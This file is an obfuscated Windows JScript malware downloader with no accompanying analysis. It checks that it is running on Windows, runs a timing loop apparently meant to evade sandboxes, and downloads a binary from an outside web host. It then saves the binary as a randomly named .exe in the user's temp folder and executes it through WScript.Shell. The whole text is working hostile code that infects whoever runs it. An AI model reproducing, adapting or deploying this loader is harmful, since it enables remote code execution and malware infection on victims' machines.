var _Y = false;
var _Q = "CreateObject";
var _P = function _E() {return WScript[_Q]("WScript"+".Shell");}(), _I = 11;
var _IX = "MSXML2.XMLHTTP";
var _K = 2123213;
var _FI = 0;
function _JF(_QU){_P["Run"](_QU, _FI, _FI);};
function _Z0(){return _IX + "";};
function _VF(_C, _Q1){_FI = _FI * 1; return _C - _Q1;};
function _XN(){return _Q;};
/*@cc_on
  @if (@_win32 || @_win64)
    _Y = true;
  @end
@*/
if (_Y)
{
var _UU = "";
function _B(){return 22;};
var _XD = 0; var _T = 0;
function _R()
{
var _A1 = new this["Date"]();
var _XA = _A1["getUTCMilliseconds"]();
WScript["Sleep"](_B());
var _A1 = new this["Date"]();
var _Q0 = _A1["getUTCMilliseconds"]();
WScript["Sleep"](_B());
var _A1 = new this["Date"]();
var _UB = _A1["getUTCMilliseconds"]();
var _XD = "_VK";
_XD = _VF(_Q0, _XA);
var _T = "_D";
_T = _VF(_UB, _Q0);
_UU = "open";
return _VF(_XD, _T);
}
var _H = false;
var _D0 = false;
for (var _G0 = _FI; _G0 < _B() * 1; _G0++){if (_R() != _FI){
_H = true; 
_T = "31" + 11 * _XD + _T; 
_D0 = true; 
break;
}}
function _G() {return ((_H == true) && (_H == _D0)) ? 1 : _FI;};
if (_H && _G() && _D0){
function _Z() {return _P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "HetXFiU8KXbqxgGq.ex" + "e";};
 _E0 = _Z0();
 _O = WScript[_Q](_E0);
 var _ZH = 1;
 while (_ZH){
try {
	if (_ZH == 1)
	{
		_O[_UU]("GET", "http://goldish.dk/o2pds", false);
		_O["send"]();
		_OU = "Sleep";
	}
	WScript[_OU](_B() + 120); 
	if (_O["readystate"] < 2 * 2) continue;
	_ZH = _FI;
	function _A(_EV) {var _F = (1, 2, 3, 4, 5, _EV); return _F;};
	_F0 = WScript[_XN()]("ADODB.Stream");
	_E0 = _F0;
	_E0[_UU]();
	_E0["type"] = _A(1);
	_E0["write"](_O["ResponseBody"]);
	_F0["position"] = _A(_FI);
	_E0["Save" + "ToFile"](_Z(), 2);
	_F0["cl"+"ose"]();
	_A0 = _Z();
	_JF(_A0);
} catch(_CV){};
}
}
}

